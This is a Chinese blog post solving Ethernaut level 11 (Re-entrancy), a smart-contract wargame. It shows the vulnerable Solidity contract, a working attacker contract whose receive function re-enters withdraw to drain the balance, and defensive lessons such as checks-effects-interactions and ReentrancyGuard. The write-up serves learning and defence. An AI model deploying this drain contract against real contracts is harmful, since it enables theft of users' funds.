---
title: Ethernaut 闯关笔记 第11关 Re-entrancy
date: 2023-12-13 18:59:32
tags:
---

# 原始代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value:_amount}("");
        if(result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

# 攻击思路

很经典的重入攻击。

重入攻击的基本思路就是，合约向另一个合约发送代币时，如果触发了 `fallback` 函数，而 `fallback` 函数又可以在目标合约更新余额之前再次调用目标合约。

如果在 `fallback` 函数中再次调用目标合约，就有可能在余额更新之前再一次提取其中的资金。在以太坊的发展史上，这种攻击导致了灾难性后果，最终导致了一次硬分叉。

# 攻击代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import '@openzeppelin-contracts/math/SafeMath.sol';

contract Reentrance {
  
    // using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value:_amount}("");
        if(result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Reentrancy{
    Reentrance target;

    function myfund() public payable {}

    function hack(address payable targetAddress) public {
        target = Reentrance(targetAddress);
        uint256 money = address(this).balance;
        target.donate{value: money}(address(this));
        target.withdraw(money);
    }

    receive() external payable {
        target.withdraw(0.001 ether);
    }
}
```

# 安全启示

1. 使用 Checks-Effects-Interactions 模式进行合约设计
2. 使用 `ReentrancyGuard` 防范重入攻击
3. 伊斯坦布尔硬分叉之后， `transfer` 和 `send` 不再推荐被使用
4. 永远都要假设，资金的接收地址可能是另一个合约，对方可能会运行 `fallback` 函数与合约再一次交互